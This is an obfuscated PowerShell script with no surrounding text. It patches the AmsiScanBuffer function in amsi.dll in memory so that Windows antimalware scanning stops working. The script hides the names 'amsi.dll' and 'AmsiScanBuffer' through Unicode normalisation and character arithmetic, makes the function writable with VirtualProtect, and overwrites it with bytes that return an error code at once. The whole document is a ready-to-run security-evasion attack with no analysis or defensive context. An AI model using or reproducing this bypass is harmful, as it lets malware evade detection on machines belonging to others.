$R9v9sRJ5qR = @"
using System;
using System.Runtime.InteropServices;
public class R9v9sRJ5qR {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr yVNzoE98kcTX4G0Mg, string R2jneIzXlIwgk_S8B);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr VUmFUmGx, UIntPtr KUPqNBNnTZl7, uint mHRWKdXPAFe, out uint fpCo0ONu);
}
"@

Add-Type $R9v9sRJ5qR

$YVkMHJv = [R9v9sRJ5qR]::LoadLibrary("$(('àmsì.d'+'ll').NORMALIZe([cHAR](70*50/50)+[cHaR]([ByTe]0x6f)+[cHAR]([bYtE]0x72)+[ChAr]([bYtE]0x6d)+[CHaR](68+51-51)) -replace [chAR]([ByTe]0x5c)+[ChAr]([BYtE]0x70)+[cHar](123+77-77)+[chAr](77*58/58)+[cHaR](110)+[cHAr]([byTe]0x7d))")
$dPJ3Iq = [R9v9sRJ5qR]::GetProcAddress($YVkMHJv, "$(('ÄmsíScãnBúf'+'fêr').NORmalIze([cHaR](70*6/6)+[CHAr](111)+[cHar](66+48)+[Char]([bYte]0x6d)+[chAr]([byTE]0x44)) -replace [chAr]([ByTe]0x5c)+[CHAR]([BYTe]0x70)+[CHAR]([bYTE]0x7b)+[ChaR]([Byte]0x4d)+[cHAR]([byTE]0x6e)+[CHAR](125*28/28))")
$p = 0
[R9v9sRJ5qR]::VirtualProtect($dPJ3Iq, [uint32]5, 0x40, [ref]$p)
$TNV_P9F = "0xB8"
$j7r5H2Y74CZbz = "0x57"
$xpwWMoPbplU3 = "0x00"
$TVhAxO = "0x07"
$AaPDfY_0so = "0x80"
$mEeQDN = "0xC3"
$SlWAIV73Z0JxanyNp = [Byte[]] ($TNV_P9F,$j7r5H2Y74CZbz,$xpwWMoPbplU3,$TVhAxO,+$AaPDfY_0so,+$mEeQDN)
[System.Runtime.InteropServices.Marshal]::Copy($SlWAIV73Z0JxanyNp, 0, $dPJ3Iq, 6)